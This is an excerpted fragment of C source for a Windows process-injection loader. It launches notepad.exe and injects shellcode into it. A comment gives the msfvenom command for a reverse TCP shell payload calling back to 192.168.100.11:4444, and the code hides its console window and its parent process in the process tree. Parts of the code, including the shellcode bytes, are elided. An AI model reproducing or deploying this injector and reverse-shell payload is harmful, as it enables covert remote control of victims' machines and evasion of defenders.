...
int main() {
	...
	//Create the process
	const LPCSTR LpApplicationName = "C:/Windows/System32/notepad.exe";
	STARTUPINFOA si;
	...
	CreateProcessA(LpApplicationName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	//printf("PID of notepad.exe is %lu", pi.dwProcessId); //Print the PID of the child process

	
    //Inject into the process
    //msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.11 LPORT=4444 -f 
    char shellcode[] = {
	...
	CloseHandle(hprocess);
 	...
 	//parameters for the ShowWindow function to hide the CMD prompt
    HWND hCurrentWindow;
    ...
    //Commenting out the below will kill the parent process in explorer and will show just notepad in the process tree.
